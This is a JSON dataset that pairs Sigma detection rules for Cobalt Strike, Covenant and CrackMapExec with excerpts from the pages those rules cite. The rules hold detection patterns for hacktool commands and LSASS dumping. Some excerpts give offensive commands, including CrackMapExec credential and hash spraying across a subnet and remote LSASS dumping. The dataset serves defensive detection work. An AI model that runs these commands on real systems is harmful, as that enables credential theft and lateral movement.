          "id": "647c7b9e-d784-4fda-b9a0-45c565a7b729",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects Cobalt Strike module/commands accidentally entered in CMD shell",
      "references": [
        "https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf",
        "https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/",
        "https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/"
      ],
      "author": "_pete_0, TheDFIRReport",
      "date": "2022-05-06",
      "modified": "2023-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "Cmd.Exe"
          },
          {
            "Image|endswith": "\\cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "Invoke-UserHunter",
            "Invoke-ShareFinder",
            "Invoke-Kerberoast",
            "Invoke-SMBAutoBrute",
            "Invoke-Nightmare",
            "zerologon",
            "av_query"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_bloopers_modules.yml"
  },
  "196": {
    "url": "https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/",
    "markdown": "",
    "sigma_rule": {
      "title": "Operator Bloopers Cobalt Strike Modules",
      "id": "4f154fb6-27d1-4813-a759-78b93e0b9c48",
      "related": [
        {
          "id": "647c7b9e-d784-4fda-b9a0-45c565a7b729",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects Cobalt Strike module/commands accidentally entered in CMD shell",
      "references": [
        "https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf",
        "https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/",
        "https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/"
      ],
      "author": "_pete_0, TheDFIRReport",
      "date": "2022-05-06",
      "modified": "2023-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "Cmd.Exe"
          },
          {
            "Image|endswith": "\\cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "Invoke-UserHunter",
            "Invoke-ShareFinder",
            "Invoke-Kerberoast",
            "Invoke-SMBAutoBrute",
            "Invoke-Nightmare",
            "zerologon",
            "av_query"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_bloopers_modules.yml"
  },
  "197": {
    "url": "https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/",
    "markdown": "",
    "sigma_rule": {
      "title": "Operator Bloopers Cobalt Strike Modules",
      "id": "4f154fb6-27d1-4813-a759-78b93e0b9c48",
      "related": [
        {
          "id": "647c7b9e-d784-4fda-b9a0-45c565a7b729",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects Cobalt Strike module/commands accidentally entered in CMD shell",
      "references": [
        "https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf",
        "https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/",
        "https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/"
      ],
      "author": "_pete_0, TheDFIRReport",
      "date": "2022-05-06",
      "modified": "2023-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "Cmd.Exe"
          },
          {
            "Image|endswith": "\\cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "Invoke-UserHunter",
            "Invoke-ShareFinder",
            "Invoke-Kerberoast",
            "Invoke-SMBAutoBrute",
            "Invoke-Nightmare",
            "zerologon",
            "av_query"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_bloopers_modules.yml"
  },
  "198": {
    "url": "https://www.cobaltstrike.com/help-windows-executable",
    "markdown": "# User-driven Attack Packages The best attacks are not exploits. Rather, the best attacks take advantage of normal features to get code execution. **Cobalt Strike** makes it easy to setup several user-driven attacks. These attacks take advantage of listeners you’ve already setup. Navigate in the menu to **Payloads** and choose one of the following options. ## HTML Application An HTML Application is a Windows program written in HTML and an Internet Explorer supported scripting language. This package generates an HTML Application that runs a **Cobalt Strike** listener. Navigate to **Payloads -> HTML Application**. [Image Details: **Alt Text**: HTML Application Attack",
    "sigma_rule": {
      "title": "CobaltStrike Load by Rundll32",
      "id": "ae9c6a7c-9521-42a6-915e-5aaa8689d529",
      "status": "test",
      "description": "Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line.",
      "references": [
        "https://www.cobaltstrike.com/help-windows-executable",
        "https://redcanary.com/threat-detection-report/",
        "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/"
      ],
      "author": "Wojciech Lesicki",
      "date": "2021-06-01",
      "modified": "2022-09-16",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_rundll": [
          {
            "Image|endswith": "\\rundll32.exe"
          },
          {
            "OriginalFileName": "RUNDLL32.EXE"
          },
          {
            "CommandLine|contains": [
              "rundll32.exe",
              "rundll32 "
            ]
          }
        ],
        "selection_params": {
          "CommandLine|contains": ".dll",
          "CommandLine|endswith": [
            " StartW",
            ",StartW"
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_load_by_rundll32.yml"
  },
  "199": {
    "url": "https://redcanary.com/threat-detection-report/",
    "markdown": "",
    "sigma_rule": {
      "title": "CobaltStrike Load by Rundll32",
      "id": "ae9c6a7c-9521-42a6-915e-5aaa8689d529",
      "status": "test",
      "description": "Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line.",
      "references": [
        "https://www.cobaltstrike.com/help-windows-executable",
        "https://redcanary.com/threat-detection-report/",
        "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/"
      ],
      "author": "Wojciech Lesicki",
      "date": "2021-06-01",
      "modified": "2022-09-16",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_rundll": [
          {
            "Image|endswith": "\\rundll32.exe"
          },
          {
            "OriginalFileName": "RUNDLL32.EXE"
          },
          {
            "CommandLine|contains": [
              "rundll32.exe",
              "rundll32 "
            ]
          }
        ],
        "selection_params": {
          "CommandLine|contains": ".dll",
          "CommandLine|endswith": [
            " StartW",
            ",StartW"
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_load_by_rundll32.yml"
  },
  "200": {
    "url": "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/",
    "markdown": "# Ryuk in 5 Hours **Categories:** adfind bazar cobaltstrike ransomware rdp ryuk yara **Published on:** October 18, 2020 ## Intro The Ryuk threat actors went from a phishing email to domain-wide ransomware in 5 hours. They escalated privileges using Zerologon (CVE-2020-1472), less than 2 hours after the initial phish. They used tools such as Cobalt Strike, AdFind, WMI, and PowerShell to accomplish their objective. Ryuk has been one of the most proficient ransomware gangs in the past few years, with the FBI claiming $61 million USD having been paid to the group as of February 2020. Earlier in the year,",
    "sigma_rule": {
      "title": "CobaltStrike Load by Rundll32",
      "id": "ae9c6a7c-9521-42a6-915e-5aaa8689d529",
      "status": "test",
      "description": "Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line.",
      "references": [
        "https://www.cobaltstrike.com/help-windows-executable",
        "https://redcanary.com/threat-detection-report/",
        "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/"
      ],
      "author": "Wojciech Lesicki",
      "date": "2021-06-01",
      "modified": "2022-09-16",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_rundll": [
          {
            "Image|endswith": "\\rundll32.exe"
          },
          {
            "OriginalFileName": "RUNDLL32.EXE"
          },
          {
            "CommandLine|contains": [
              "rundll32.exe",
              "rundll32 "
            ]
          }
        ],
        "selection_params": {
          "CommandLine|contains": ".dll",
          "CommandLine|endswith": [
            " StartW",
            ",StartW"
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_load_by_rundll32.yml"
  },
  "201": {
    "url": "https://hausec.com/2021/07/26/cobalt-strike-and-tradecraft/",
    "markdown": "# Cobalt Strike and Tradecraft **July 26, 2021** ## Introduction It’s been known that some built-in commands in Cobalt Strike are major op-sec no-no’s, but *why* are they bad? The goal of this post isn’t to teach you “good” op-sec, as I feel that is a bit subjective and dependent on the maturity of the target’s environment, nor is it “how to detect Cobalt Strike”. The purpose of this post is to document what some Cobalt Strike techniques look like under the hood or to a defender’s point of view. Realistically, this post is just breaking down a page straight",
    "sigma_rule": {
      "title": "Potential CobaltStrike Process Patterns",
      "id": "f35c5d71-b489-4e22-a115-f003df287317",
      "status": "test",
      "description": "Detects potential process patterns related to Cobalt Strike beacon activity",
      "references": [
        "https://hausec.com/2021/07/26/cobalt-strike-and-tradecraft/",
        "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-07-27",
      "modified": "2023-03-29",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_generic_1": {
          "CommandLine|endswith": "cmd.exe /C whoami",
          "ParentImage|startswith": "C:\\Temp\\"
        },
        "selection_generic_2": {
          "ParentImage|endswith": [
            "\\runonce.exe",
            "\\dllhost.exe"
          ],
          "CommandLine|contains|all": [
            "cmd.exe /c echo",
            "> \\\\\\\\.\\\\pipe"
          ]
        },
        "selection_conhost_1": {
          "ParentCommandLine|contains|all": [
            "cmd.exe /C echo",
            " > \\\\\\\\.\\\\pipe"
          ],
          "CommandLine|endswith": "conhost.exe 0xffffffff -ForceV1"
        },
        "selection_conhost_2": {
          "ParentCommandLine|endswith": "/C whoami",
          "CommandLine|endswith": "conhost.exe 0xffffffff -ForceV1"
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_process_patterns.yml"
  },
  "202": {
    "url": "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/",
    "markdown": "# Cobalt Strike, a Defender’s Guide **Categories:** CobaltStrike, Tools **Published on:** August 29, 2021 --- ## Intro In our research, we expose adversarial Tactics, Techniques, and Procedures (TTPs) as well as the tools they use to execute their mission objectives. In most of our cases, we see the threat actors utilizing Cobalt Strike. Therefore, defenders should know how to detect Cobalt Strike in various stages of its execution. The primary purpose of this post is to expose the most common techniques that we see from the intrusions that we track and provide detections. Having said that, not all of Cobalt",
    "sigma_rule": {
      "title": "Potential CobaltStrike Process Patterns",
      "id": "f35c5d71-b489-4e22-a115-f003df287317",
      "status": "test",
      "description": "Detects potential process patterns related to Cobalt Strike beacon activity",
      "references": [
        "https://hausec.com/2021/07/26/cobalt-strike-and-tradecraft/",
        "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-07-27",
      "modified": "2023-03-29",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_generic_1": {
          "CommandLine|endswith": "cmd.exe /C whoami",
          "ParentImage|startswith": "C:\\Temp\\"
        },
        "selection_generic_2": {
          "ParentImage|endswith": [
            "\\runonce.exe",
            "\\dllhost.exe"
          ],
          "CommandLine|contains|all": [
            "cmd.exe /c echo",
            "> \\\\\\\\.\\\\pipe"
          ]
        },
        "selection_conhost_1": {
          "ParentCommandLine|contains|all": [
            "cmd.exe /C echo",
            " > \\\\\\\\.\\\\pipe"
          ],
          "CommandLine|endswith": "conhost.exe 0xffffffff -ForceV1"
        },
        "selection_conhost_2": {
          "ParentCommandLine|endswith": "/C whoami",
          "CommandLine|endswith": "conhost.exe 0xffffffff -ForceV1"
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_process_patterns.yml"
  },
  "203": {
    "url": "https://posts.specterops.io/covenant-v0-5-eee0507b85ba",
    "markdown": "# Covenant v0.5 ## Intro Covenant v0.5 is being released today and includes a set of new features, a major UI update, and lots of bug fixes. This will be a short post documenting some of the major feature updates. ## Blazor: Front-End C# The largest update in v0.5 is migrating the interface over to the Blazor framework. Blazor is a framework for writing client-side web interfaces in C#. Prior to Blazor, Covenant didn’t utilize any real client-side framework like React, Angular, etc. The client-side of the Web UI was written with some one-off JavaScript functions that utilized only JQuery.",
    "sigma_rule": {
      "title": "HackTool - Covenant PowerShell Launcher",
      "id": "c260b6db-48ba-4b4a-a76f-2f67644e99d2",
      "status": "test",
      "description": "Detects suspicious command lines used in Covenant luanchers",
      "references": [
        "https://posts.specterops.io/covenant-v0-5-eee0507b85ba"
      ],
      "author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community",
      "date": "2020-06-04",
      "modified": "2023-02-21",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1059.001",
        "attack.t1564.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_1": {
          "CommandLine|contains|all": [
            "-Sta",
            "-Nop",
            "-Window",
            "Hidden"
          ],
          "CommandLine|contains": [
            "-Command",
            "-EncodedCommand"
          ]
        },
        "selection_2": {
          "CommandLine|contains": [
            "sv o (New-Object IO.MemorySteam);sv d ",
            "mshta file.hta",
            "GruntHTTP",
            "-EncodedCommand cwB2ACAAbwAgA"
          ]
        },
        "condition": "1 of selection_*"
      },
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_covenant.yml"
  },
  "204": {
    "url": "https://web.archive.org/web/20220625234519/https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local",
    "markdown": "# Checking credentials (Local) ## User/Password/Hashes Adding `--local-auth` to any of the authentication commands will attempt to logon locally. 1. `#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-auth` 2. `#~ cme smb 192.168.1.0/24 -u '' -p '' --local-auth` 3. `#~ cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --local-auth` 4. `#~ cme smb 192.168.1.0/24 -u UserNAme -H 'NTHASH' --local-auth` 5. `#~ cme smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth` 6. `#~ cme smb 192.168.1.0/24 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth` Results will display the hostname next to the user:password. 1. `SMB 192.168.1.101 445 HOSTNAME [+] HOSTNAME\\Username:Password (Pwn3d!)`",
    "sigma_rule": {
      "title": "HackTool - CrackMapExec Execution",
      "id": "42a993dd-bb3e-48c8-b372-4d6684c4106c",
      "status": "test",
      "description": "This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.",
      "references": [
        "https://web.archive.org/web/20220625234519/https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local",
        "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
        "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz",
        "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-25",
      "modified": "2023-03-08",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.credential-access",
        "attack.discovery",
        "attack.t1047",
        "attack.t1053",
        "attack.t1059.003",
        "attack.t1059.001",
        "attack.t1110",
        "attack.t1201"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_binary": {
          "Image|endswith": "\\crackmapexec.exe"
        },
        "selection_special": {
          "CommandLine|contains": " -M pe_inject "
        },
        "selection_execute": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -x "
          ]
        },
        "selection_hash": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -p ",
            " -H 'NTHASH'"
          ]
        },
        "selection_module_mssql": {
          "CommandLine|contains|all": [
            " mssql ",
            " -u ",
            " -p ",
            " -M ",
            " -d "
          ]
        },
        "selection_module_smb1": {
          "CommandLine|contains|all": [
            " smb ",
            " -u ",
            " -H ",
            " -M ",
            " -o "
          ]
        },
        "selection_module_smb2": {
          "CommandLine|contains|all": [
            " smb ",
            " -u ",
            " -p ",
            " --local-auth"
          ]
        },
        "part_localauth_1": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -p "
          ]
        },
        "part_localauth_2": {
          "CommandLine|contains|all": [
            " 10.",
            " 192.168.",
            "/24 "
          ]
        },
        "condition": "1 of selection_* or all of part_localauth*"
      },
      "fields": [
        "ComputerName",
        "User",
        "CommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_crackmapexec_execution.yml"
  },
  "205": {
    "url": "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
    "markdown": "# Left On Read: Telegram Malware Spotted in Latest Iranian Cyber Espionage Activity **February 24, 2022** --- In November 2021, Mandiant Managed Defense detected and responded to an UNC3313 intrusion at a Middle East government customer. During the investigation, Mandiant identified new targeted malware, GRAMDOOR and STARWHALE, which implement simple backdoor functionalities. We also identified UNC3313 using publicly available remote access software to maintain access to the environment. UNC3313 initially gained access to this organization through a targeted phishing email and leveraged modified, open-source offensive security tools to identify accessible systems and move laterally. UNC3313 moved rapidly to establish remote",
    "sigma_rule": {
      "title": "HackTool - CrackMapExec Execution",
      "id": "42a993dd-bb3e-48c8-b372-4d6684c4106c",
      "status": "test",
      "description": "This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.",
      "references": [
        "https://web.archive.org/web/20220625234519/https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local",
        "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
        "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz",
        "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-25",
      "modified": "2023-03-08",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.credential-access",
        "attack.discovery",
        "attack.t1047",
        "attack.t1053",
        "attack.t1059.003",
        "attack.t1059.001",
        "attack.t1110",
        "attack.t1201"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_binary": {
          "Image|endswith": "\\crackmapexec.exe"
        },
        "selection_special": {
          "CommandLine|contains": " -M pe_inject "
        },
        "selection_execute": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -x "
          ]
        },
        "selection_hash": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -p ",
            " -H 'NTHASH'"
          ]
        },
        "selection_module_mssql": {
          "CommandLine|contains|all": [
            " mssql ",
            " -u ",
            " -p ",
            " -M ",
            " -d "
          ]
        },
        "selection_module_smb1": {
          "CommandLine|contains|all": [
            " smb ",
            " -u ",
            " -H ",
            " -M ",
            " -o "
          ]
        },
        "selection_module_smb2": {
          "CommandLine|contains|all": [
            " smb ",
            " -u ",
            " -p ",
            " --local-auth"
          ]
        },
        "part_localauth_1": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -p "
          ]
        },
        "part_localauth_2": {
          "CommandLine|contains|all": [
            " 10.",
            " 192.168.",
            "/24 "
          ]
        },
        "condition": "1 of selection_* or all of part_localauth*"
      },
      "fields": [
        "ComputerName",
        "User",
        "CommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_crackmapexec_execution.yml"
  },
  "206": {
    "url": "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz",
    "markdown": "# CrackMapExec Mimikatz (mssql) This page contains detailed information about how to use the **mimikatz** CME module while using the **mssql** protocol. For a list of all CrackMapExec modules, visit the CrackMapExec Module Library. ## Description --- This module executes PowerSploit's `Invoke-Mimikatz.ps1` script (Mimikatz's DPAPI Module) and extracts cached credentials from memory from the LSASS subsystem. In essence, it executes `privilege::debug` and `sekurlsa::logonpasswords` Mimikatz commands. The mimikatz module is OPSEC safe. This means that it doesn't touch the disk and therefore shouldn't trigger any alarms. ## Supported Protocols --- - mssql - smb ## Module Source Code --- - https://github.com/byt3bl33d3r/CrackMapExec/tree/master/cme/modules/mimikatz.py",
    "sigma_rule": {
      "title": "HackTool - CrackMapExec Execution",
      "id": "42a993dd-bb3e-48c8-b372-4d6684c4106c",
      "status": "test",
      "description": "This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.",
      "references": [
        "https://web.archive.org/web/20220625234519/https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local",
        "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
        "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz",
        "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-25",
      "modified": "2023-03-08",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.credential-access",
        "attack.discovery",
        "attack.t1047",
        "attack.t1053",
        "attack.t1059.003",
        "attack.t1059.001",
        "attack.t1110",
        "attack.t1201"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_binary": {
          "Image|endswith": "\\crackmapexec.exe"
        },
        "selection_special": {
          "CommandLine|contains": " -M pe_inject "
        },
        "selection_execute": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -x "
          ]
        },
        "selection_hash": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -p ",
            " -H 'NTHASH'"
          ]
        },
        "selection_module_mssql": {
          "CommandLine|contains|all": [
            " mssql ",
            " -u ",
            " -p ",
            " -M ",
            " -d "
          ]
        },
        "selection_module_smb1": {
          "CommandLine|contains|all": [
            " smb ",
            " -u ",
            " -H ",
            " -M ",
            " -o "
          ]
        },
        "selection_module_smb2": {
          "CommandLine|contains|all": [
            " smb ",
            " -u ",
            " -p ",
            " --local-auth"
          ]
        },
        "part_localauth_1": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -p "
          ]
        },
        "part_localauth_2": {
          "CommandLine|contains|all": [
            " 10.",
            " 192.168.",
            "/24 "
          ]
        },
        "condition": "1 of selection_* or all of part_localauth*"
      },
      "fields": [
        "ComputerName",
        "User",
        "CommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_crackmapexec_execution.yml"
  },
  "207": {
    "url": "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject",
    "markdown": "# CrackMapExec Pe_inject (smb) This page contains detailed information about how to use the **pe_inject** CME module while using the **smb** protocol. For a list of all CrackMapExec modules, visit the CrackMapExec Module Library. ## Description --- This module downloads the specified DLL/EXE and injects it into memory using PowerSploit's `Invoke-ReflectivePEInjection.ps1` script. The pe_inject module is OPSEC safe. This means that it doesn't touch the disk and therefore shouldn't trigger any alarms. ## Supported Protocols --- - mssql - smb ## Module Source Code --- - https://github.com/byt3bl33d3r/CrackMapExec/tree/master/cme/modules/pe_inject.py ## Authors --- - @byt3bl33d3r ## Module Options --- Here is a complete",
    "sigma_rule": {
      "title": "HackTool - CrackMapExec Execution",
      "id": "42a993dd-bb3e-48c8-b372-4d6684c4106c",
      "status": "test",
      "description": "This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.",
      "references": [
        "https://web.archive.org/web/20220625234519/https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local",
        "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
        "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz",
        "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-25",
      "modified": "2023-03-08",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.credential-access",
        "attack.discovery",
        "attack.t1047",
        "attack.t1053",
        "attack.t1059.003",
        "attack.t1059.001",
        "attack.t1110",
        "attack.t1201"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_binary": {
          "Image|endswith": "\\crackmapexec.exe"
        },
        "selection_special": {
          "CommandLine|contains": " -M pe_inject "
        },
        "selection_execute": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -x "
          ]
        },
        "selection_hash": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -p ",
            " -H 'NTHASH'"
          ]
        },
        "selection_module_mssql": {
          "CommandLine|contains|all": [
            " mssql ",
            " -u ",
            " -p ",
            " -M ",
            " -d "
          ]
        },
        "selection_module_smb1": {
          "CommandLine|contains|all": [
            " smb ",
            " -u ",
            " -H ",
            " -M ",
            " -o "
          ]
        },
        "selection_module_smb2": {
          "CommandLine|contains|all": [
            " smb ",
            " -u ",
            " -p ",
            " --local-auth"
          ]
        },
        "part_localauth_1": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -p "
          ]
        },
        "part_localauth_2": {
          "CommandLine|contains|all": [
            " 10.",
            " 192.168.",
            "/24 "
          ]
        },
        "condition": "1 of selection_* or all of part_localauth*"
      },
      "fields": [
        "ComputerName",
        "User",
        "CommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_crackmapexec_execution.yml"
  },
  "208": {
    "url": "https://web.archive.org/web/20220625230734/https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials/dump-lsass",
    "markdown": "# Dump LSASS You need at least local admin privilege on the remote target, use option `--local-auth` if your user is a local account. ## Using Lsassy Using the module Lsassy from @pixis you can dump remotely the credentials. ``` #~ cme smb 192.168.255.131 -u administrator -p pass -M lsassy ``` ```image Alt: Lsassy Example Description: The image displays a terminal window showing the output of a command executed using CrackMapExec (CME) to dump LSASS (Local Security Authority Subsystem Service) data from a target machine with IP address 192.168.255.131. The command is executed with the username 'administrator' and password 'Password123'.",
    "sigma_rule": {
      "title": "HackTool - CrackMapExec Process Patterns",
      "id": "f26307d8-14cd-47e3-a26b-4b4769f24af6",
      "status": "test",
      "description": "Detects suspicious process patterns found in logs when CrackMapExec is used",
      "references": [
        "https://web.archive.org/web/20220625230734/https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials/dump-lsass"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-03-12",
      "modified": "2023-02-13",
      "tags": [
        "attack.credential-access",
        "attack.t1003.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_lsass_dump1": {
          "CommandLine|contains|all": [
            "tasklist /fi ",
            "Imagename eq lsass.exe"
          ],
          "CommandLine|contains": [
            "cmd.exe /c ",
            "cmd.exe /r ",
            "cmd.exe /k ",
            "cmd /c ",
            "cmd /r ",
            "cmd /k "
          ],
          "User|contains": [
            "AUTHORI",
            "AUTORI"
          ]
        },
        "selection_lsass_dump2": {
          "CommandLine|contains|all": [
            "do rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump",
            "\\Windows\\Temp\\",
            " full",
            "%%B"
          ]
        },
        "selection_procdump": {
          "CommandLine|contains|all": [
